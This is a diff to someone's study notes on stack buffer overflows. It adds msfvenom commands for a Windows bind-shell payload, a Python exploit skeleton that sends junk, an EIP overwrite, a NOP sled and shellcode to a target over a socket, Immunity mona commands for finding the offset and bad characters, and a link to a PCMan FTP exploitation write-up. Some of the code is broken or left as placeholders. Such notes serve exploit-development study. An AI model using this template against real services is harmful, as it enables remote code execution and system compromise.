@@ -1,6 +1,46 @@
 Buffer Overflows
 
 
+msfvenom -a x86 --platform windows -p windows/ shell_bind_tcp LPORT=4321 - b '\x00\x11\x22\x33\x44' -f python
+
+msfvenom -p windows/shell_bind_tcp LPORT=4321 -b '\x00\x11\x22\x33\x44' -f c
+
+junk = "\x41" * pattern_ofset + '\x11\x22\x33\x44'+ '\x90' * 20 + shellcode +'\x42' * (buffer_size-pattern_ofset-4-20-
+                                     EIP
+len(shellcode))
+
+=================
+
+#!/usr/bin/python
+import socket
+import sys
+
+junk = '\x41' * pattern_ofset
+eip  = '\x11\x22\x33\x44'
+nops = '\x90' * 20
+shellcode = shellcode=("\")
+other = '\x42' * (buffer_size - pattern_ofset - eip - nops - len(shellcode))
+
+buffer = junk + eip + nops + shellcode + other
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((sys.argv[1], 4455))
+s.send(buffer)
+s.recv(1024)
+s.close()
+
+========================
+IMMUNITY
+
+!mona pattern_ofset 0x000000
+!mona findmsp
+!mona jmp -r ESP
+!mona bytearray
+!mona compare -c c:\logs\XXXX\bytearray.bin -a 0x000000
+
+============================
+
+
 CPU registers are used like variables by storing data for quick access.
 On 32-bit machines, each register is 4 bytes or 32-bits.
 
@@ -186,3 +226,8 @@ run `python -c 'print "\x41" * 504 + "\x42" * 4'`
 y
 x/16wx $esp # not sure what this does
 info registers
+
+Link 
+===
+
+https://gurelahmet.com/stack-tabanl%C4%B1-buffer-overflow-zafiyeti-pcman-ftp-server-2-0-7/
